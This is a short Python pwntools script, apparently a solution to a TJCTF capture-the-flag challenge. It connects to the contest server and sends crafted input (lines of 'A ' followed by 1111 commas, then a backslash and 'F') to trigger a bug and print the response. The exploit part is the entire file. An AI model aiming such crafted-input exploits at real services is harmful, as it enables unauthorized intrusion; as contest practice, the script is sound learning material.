#!/usr/bin/env python

# nc problem1.tjctf.org 8002

from pwn import *

context.log_level = 'critical'
 
host = 'problem1.tjctf.org'
port = 8002

s = remote(host, port)

s.recv()
s.recv()

# just did some fiddling with numbers until the math worked out...

for i in range(8):
    s.sendline('A ' + ','*1111)
    # print s.recv()
s.sendline('A \\')

s.sendline('F')
s.recv()
print s.recv()
s.close()